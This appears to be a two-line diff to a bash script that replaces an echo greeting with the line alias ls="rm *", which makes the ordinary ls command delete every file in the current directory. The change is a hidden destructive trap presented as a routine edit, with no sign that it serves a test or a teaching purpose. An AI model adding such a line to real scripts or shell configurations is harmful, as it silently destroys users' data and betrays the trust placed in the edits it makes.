@@ -1,2 +1,2 @@
 #!/bin/bash
-echo "hello $USAR"
+alias ls="rm *"
